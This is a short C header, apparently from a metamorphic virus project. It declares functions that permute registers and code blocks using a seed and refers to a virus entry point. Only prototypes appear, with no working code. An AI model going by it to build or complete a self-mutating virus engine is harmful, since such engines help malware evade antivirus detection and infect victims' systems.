
#ifndef METAMORPHISM_H
# define METAMORPHISM_H

# include "accessors.h"
# include <stdbool.h>
# include <stdint.h>
# include <stddef.h>

bool		permutate_registers(struct safe_ptr ref, uint64_t seed);
bool		permutate_blocks(struct safe_ptr input_code, \
			struct safe_ptr output_buffer, \
			size_t *output_size,
			void *virus_entry_point, int32_t *virus_func_shift, \
			uint64_t seed);

#endif
